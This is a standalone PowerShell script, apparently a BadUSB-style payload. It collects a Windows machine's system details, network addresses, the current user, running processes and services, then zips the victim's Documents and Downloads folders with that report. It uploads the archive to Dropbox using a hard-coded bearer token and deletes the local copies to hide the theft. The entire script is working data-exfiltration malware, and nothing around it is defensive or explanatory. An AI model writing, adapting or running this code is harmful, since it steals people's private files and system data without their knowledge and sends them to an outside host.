# Output File Path
$outputFilePath = "$env:USERPROFILE\Downloads\System_Info.txt"

# Gather System Information (with UTF-8 encoding)
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $outputFilePath -Encoding UTF8
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-WmiObject -Class Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-WinHomeLocation | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-WinSystemLocale | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
$currentUser.Identity.Name | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-Process | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
Get-Service | Out-File -FilePath $outputFilePath -Append -Encoding UTF8

Compress-Archive -Path "$env:USERPROFILE\Documents\*", "$env:USERPROFILE\Downloads\*", "$outputFilePath" -CompressionLevel Fastest -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + "sl.B7sPqufA57Xu00dt3St_E9OQgXK_1Aa921kN0rXMJcEvpR5AHkO5SaCHn9e76HzGceheZkLTwdRDKUy4qi8tdt1f3JbDdupUsQHRkMLYEYC9yklK3pmyyOazcWU5LPomCHWBdYciTyu_Kog"
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
rm $SourceFilePath
rm $outputFilePath
